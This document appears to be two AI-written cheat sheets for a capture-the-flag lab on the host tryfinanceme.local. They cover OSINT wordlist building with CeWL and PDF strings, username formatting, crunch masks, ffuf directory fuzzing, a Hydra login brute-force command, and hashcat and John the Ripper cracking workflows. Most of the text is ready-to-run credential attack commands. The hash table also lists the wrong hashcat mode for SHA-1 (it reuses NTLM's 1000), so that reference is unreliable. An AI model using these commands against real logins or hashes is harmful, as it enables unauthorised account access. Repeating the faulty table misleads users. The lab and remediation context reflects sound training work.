This is an excellent, comprehensive overview of targeted wordlist generation and practical application in defensive security testing. It covers the full lifecycle from raw Open-Source Intelligence (OSINT) gathering to weaponization with directory fuzzers and brute-forcing utilities.

Below is an operational breakdown of the core tasks covered in your documentation, formatted as a clean reference guide for quick deployment during standard security assessments.

---

## 🛠️ 1. OSINT Data Harvesting Cheat Sheet

When standard wordlists (like `rockyou.txt`) are too noisy or broad, targeted crawling allows you to build high-probability contextual lists based entirely on public footprinting.

### 🔹 Web Crawling with CeWL

CeWL automates site scraping to build localized, company-specific keyphrase repositories:

```bash
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt http://tryfinanceme.local

```

* **`-d 2`**: Spiders down to a depth of two links.
* **`-m 3`**: Filters out noisy fragments shorter than 3 characters.

### 🔹 Extracting Intelligence From Metadata (PDFs)

Corporate documents often leak naming conventions, interior server nomenclature, or legacy paths.

```bash
# 1. Download all hosted PDFs recursively
wget -r -A pdf http://tryfinanceme.local/docs/

# 2. Extract unique plaintext strings from downloaded binary documents
for f in $(find tryfinanceme.local/docs -name '*.pdf'); do 
    strings -n 5 "$f" | grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' >> raw_words.txt
done

# 3. Pull targeted corporate email patterns
grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs > emails_docs.txt

```

### 🔹 Reformatting Corporate Name Lists into Usernames

When names are extracted via web parsing (`names.txt`), use basic `awk` formatting to quickly mirror standard enterprise identity and access management (IAM) schema styles:

```bash
# Format: alex.johnson (First.Last)
awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt

# Format: ajohnson (FirstInitial+Last)
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt

# Format: alexj (First+LastInitial)
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt

```

---

## 🧼 2. Sanitization and List Normalization

A raw, uncleaned list introduces significant computational overhead during automated fuzzing passes. Normalizing structure helps optimize execution times.

```bash
# Merge raw discoveries, enforce lowercase, drop Windows line endings (\r), and ensure minimum length filters
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt

cat words_raw.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt

```

### 🔢 Pattern-Based Generator (Crunch)

If password enforcement parameters are known or leaked through documentation policies (e.g., `Helios20NN!`), generate exact character matrices to minimize dictionary sizes:

```bash
crunch 11 11 -t Helios20%%! -o pass_helios.txt

```

* **`%%`**: Tells Crunch to iterate precisely through numerical pairs (`00` to `99`), resulting in exactly 100 high-efficiency candidate entries.

---

## 🚀 3. Active Enumeration & Brute-Force Testing

With sanitized domain, path, and credential lists established, standard testing tooling can verify visibility boundaries.

### 🔹 Web Directory Discovery via `ffuf`

```bash
ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302

```

> 💡 **Operational Optimization Tip:** If the target application utilizes custom soft-404 error response pages that clutter output telemetry, run a test request to find the response size in bytes, then append `-fs <byte_size>` to filter out false positives.

### 🔹 Automated Login Verification via `Hydra`

To test the resilience of authentication endpoints against credential stuffing, pass form specifications directly to Hydra's network service module:

```bash
hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'

```

* **`-f`**: Closes active socket threads immediately upon identifying the first valid credential set.
* **`S=THM{`**: Sets the success condition (the tool flags a match if the server response contains the designated string).

---

## 🔒 Defensive Remediation Summary

To mitigate directory enumeration and custom brute-force workflows exposed by these exercises, enterprises should prioritize:

1. **Rate Limiting / Account Lockout Policies:** Implement progressive delays or account locks on authentication handlers to block high-frequency automation.
2. **Phishing-Resistant MFA:** Shift away from standard passwords by mandate, enforcing FIDO2/WebAuthn configurations.
3. **Obfuscation of Metadata:** Ensure public-facing file directories and attachments are systematically stripped of internal metadata properties before release.

   ---

   This text provides a thorough overview of offline password cracking workflows, from identifying unknown cryptography to optimization via rules and masks.

Below is an operational engineering reference cheat sheet detailing the hash structures, lookup mechanics, and the targeted syntax needed to crack the final challenge files.

---

## 🔍 1. Visual Signatures & Mode Translation

Before executing a cracking job, you must pair the hash format with its precise algorithmic designator.

| Hash Family | Length / Signature | Hashcat Mode (`-m`) | John Format (`--format=`) | Typical Structural Use Case |
| --- | --- | --- | --- | --- |
| **MD5** | 32 hex characters | `0` | `raw-md5` | Legacy web DBs, configuration files |
| **NTLM** | 32 hex characters | `1000` | `nt` | Windows SAM / Active Directory NTDS.dit |
| **SHA-1** | 40 hex characters | `1000` | `raw-sha1` | Legacy repositories, older source control |
| **SHA-256** | 64 hex characters | `1400` | `raw-sha256` | Modern web databases, Linux shadow (salted) |
| **bcrypt** | ~60 characters (`$2a$`, `$2b$`, `$2y$`) | `3200` | `bcrypt` | Modern web applications (Adaptive/Slow) |

> ⚠️ **Context Resolution:** If you encounter a raw 32-character hex hash without a known origin, use the built-in analyzer inside Hashcat to cross-reference formatting options immediately:
> ```bash
> hashcat --identify 'YOUR_HASH_STRING_HERE'
> 
> ```
> 
> 

---

## ⚔️ 2. Execution Command Matrices

### 🔹 Strategy A: Straight Wordlist (First Pass)

Tests strings exactly as they appear inside your dictionary block (e.g., `rockyou.txt`). Use this for fast wins against unmutated, historically leaked credentials.

* **Hashcat Execution:**
```bash
hashcat -m [MODE] -a 0 target_hash.txt /usr/share/wordlists/rockyou.txt

```


* **John the Ripper Execution:**
```bash
john --format=[FORMAT] --wordlist=/usr/share/wordlists/rockyou.txt target_hash.txt

```



### 🔹 Strategy B: Rule-Based Mutations (Second Pass)

Transforms wordlist entries on-the-fly to simulate common human adjustments (e.g., capitalizing the first letter, appending `1!`, or leetspeak substitutions).

* **Hashcat Execution (using `best64` rules):**
```bash
hashcat -m [MODE] -a 0 target_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/local/hashcat/rules/best64.rule

```


* **John the Ripper Execution (built-in list rules):**
```bash
john --format=[FORMAT] --wordlist=/usr/share/wordlists/rockyou.txt --rules=wordlist target_hash.txt

```



### 🔹 Strategy C: Mask Generation (Targeted Structuring)

When corporate policies dictate predictable patterns (e.g., `Company2026!`), brute-force characters within strict, customized positional constraints.

```text
?l = lowercase    ?u = uppercase    ?d = digits    ?s = special characters

```

* **Example (1 Uppercase, 5 Lowercase, 4 Digits, 1 Special):**
```bash
hashcat -m [MODE] -a 3 target_hash.txt '?u?l?l?l?l?l?d?d?d?d?s'

```



---

## 📊 3. Post-Execution & Session Upkeep

* **Retrieving Recovered Data (`--show`):**
Both tools keep local `.potfile` cache stores. If a hash was previously broken, you can read the plaintext without restarting the compute cycle:
```bash
# Hashcat recovery
hashcat -m [MODE] target_hash.txt --show

# John recovery
john --show --format=[FORMAT] target_hash.txt

```


* **Handling the Slow Curve (Bcrypt):**
Because `bcrypt` executes key derivation loops (governed by the cost variable embedded in its header, like `$2y$12$`), expect low candidate rates. Use `hashcat`'s session flags on major runs to safely preserve state progression:
```bash
# Start named state job
hashcat -m 3200 -a 0 hash4.txt /usr/share/wordlists/rockyou.txt --session=bcrypt_pass

# Restore interrupted job
hashcat --session=bcrypt_pass --restore

```
